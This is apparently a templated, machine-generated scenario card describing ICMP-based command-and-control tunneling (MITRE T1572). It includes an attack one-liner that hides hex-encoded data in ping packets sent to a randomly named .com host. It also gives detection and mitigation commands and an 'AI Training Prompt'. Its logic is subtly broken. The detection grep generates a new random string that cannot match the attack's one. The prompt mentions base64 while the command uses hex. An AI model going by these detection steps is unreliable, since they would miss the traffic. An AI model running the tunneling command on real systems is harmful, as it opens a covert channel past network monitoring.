---
type: campaign
scenario_id: 487
tactic: Command and Control
technique: "T1572: Protocol Tunneling"
technique_id: T1572
tags: [campaign, lotl, command_and_control]
---

# Using ping with custom data for ICMP-based C2 tunneling.

## Threat Description
Using ping with custom data for ICMP-based C2 tunneling.

## Attack Command
```
ping -c 4 -p $(echo c2cmd | xxd -p) $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com
```

## Detection Logic
Monitor ping ICMP: `tcpdump -i any icmp | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; Anomalous ICMP traffic: `tshark -Y 'icmp' | grep c2cmd`.

## Mitigation
Restrict ping: `chmod 700 /bin/ping`; Block ICMP: `iptables -A OUTPUT -p icmp -j DROP`.

## AI Training Prompt
Train AI to detect ICMP-based C2 tunneling via ping by analyzing custom packet data, ICMP traffic patterns, and base64-encoded payloads; suggest ICMP filtering.

## References
- MITRE ATT&CK T1572: https://attack.mitre.org/techniques/T1572/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
